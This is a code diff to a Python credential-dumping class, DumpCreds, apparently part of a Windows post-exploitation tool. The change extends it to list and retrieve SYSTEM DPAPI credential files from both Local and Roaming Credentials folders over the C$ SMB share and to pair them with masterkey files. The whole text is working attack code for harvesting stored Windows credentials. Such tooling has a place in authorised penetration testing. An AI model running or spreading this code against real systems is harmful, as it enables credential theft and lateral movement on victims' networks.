@@ -238,26 +238,34 @@ class DumpCreds:
 
                 # get SYSTEM credentials (if requested) & masterkeys
                 share = 'C$'
-                cred_path = '\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\'
+                cred_paths = [
+                    '\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\',
+                    '\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials\\',
+                ]
                 mk_path = '\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\'
 
                 if self.get_creds:
-                    try:
-                        for f in self.__smbConnection.listPath(share, ntpath.join(cred_path, '*')):
+                    for cred_path in cred_paths:
+                        try:
+                            files = self.__smbConnection.listPath(share, ntpath.join(cred_path, '*'))
+                        except Exception:
+                            logging.info(f'No credentials file found in {cred_path}')
+                            continue
+
+                        for f in files:
                             if f.is_directory() == 0:
                                 filename = f.get_longname()
                                 # "virtualapp/didlogical" creds that we skip cause not interesting
                                 if 'DFBE70A7E5CC19A398EBF1B96859CE5D' in filename:
                                     continue
+                                credential_path = ntpath.join(cred_path, filename)
                                 logging.info(f'Credential file found: {filename}')
-                                logging.info(f'Retrieving credential file: {filename}')
+                                logging.info(f'Retrieving credential file: {credential_path}')
                                 data = self.getFileContent(share, cred_path, filename)
                                 if data:
-                                    self.raw_credentials[filename] = data
+                                    self.raw_credentials[credential_path] = data
                                 else:
-                                    logging.info("Could not get content of credential file: " + filename + ", skipping")
-                    except Exception as e:
-                        logging.info('No credentials file found')
+                                    logging.info("Could not get content of credential file: " + credential_path + ", skipping")
                     # for each credential, get corresponding masterkey file
                     useless_credentials = []
                     for k, v in self.raw_credentials.items():
